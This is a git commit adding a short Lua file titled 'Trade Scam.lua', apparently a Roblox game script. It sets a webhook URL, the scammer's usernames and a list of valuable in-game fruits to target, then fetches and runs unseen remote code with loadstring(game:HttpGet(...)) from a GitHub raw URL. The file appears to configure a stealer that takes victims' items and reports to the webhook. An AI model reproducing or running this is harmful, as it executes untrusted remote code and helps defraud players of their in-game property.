a4203c39547ea1ce61a9fdbe9df467a13871d081
redz-scripts <saumyaswag4@gmail.com>
2025-03-06 09:25:11 +0530

    Trade Scam.lua

---
+++ Trade Scam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UVpsdFY3TDgtOXQtYUZyVzBnajl0QTo1cnloUC1NdnR4LXhxQW0yZmtNalgxc1lPRDkzSzhSWkFOZWwwM1lnYjJkcjFzOUFxOHNGdVV0Q09uX3BwbWg4cGtuYWNBdFY1Szd0RjVuMl84RkhFbFd3ZUlHb0pFVWdHNzhQZ3BJRG90SjhReDhFa3V6aWg2NE9QWHhVR3BnbjVsc0dXMHB2cVdCUERmNGpqdW5nZFFHdE1CVlZsSmxXaWRUcm5MTE5KU28" -- << Your Webhook
+Usernames = {"saumya_papa", "mtx_goku9"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
